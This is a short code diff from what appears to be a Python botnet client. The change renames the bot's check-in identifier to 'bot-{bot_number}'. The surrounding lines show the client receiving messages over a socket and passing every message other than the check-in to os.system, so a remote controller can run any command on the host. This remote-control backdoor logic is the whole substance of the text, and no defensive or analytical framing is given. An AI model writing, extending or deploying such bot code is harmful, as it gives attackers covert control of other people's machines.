@@ -21,7 +21,7 @@ def listen_for_messages():
     while True:
         message = s.recv(1024).decode()
         if "!connected!" in message:
-            connected_bots = f"{name}: connected \n"
+            connected_bots = f"bot-{bot_number}: connected \n"
             s.send(connected_bots.encode())
         else:
             os.system(f"{message}")
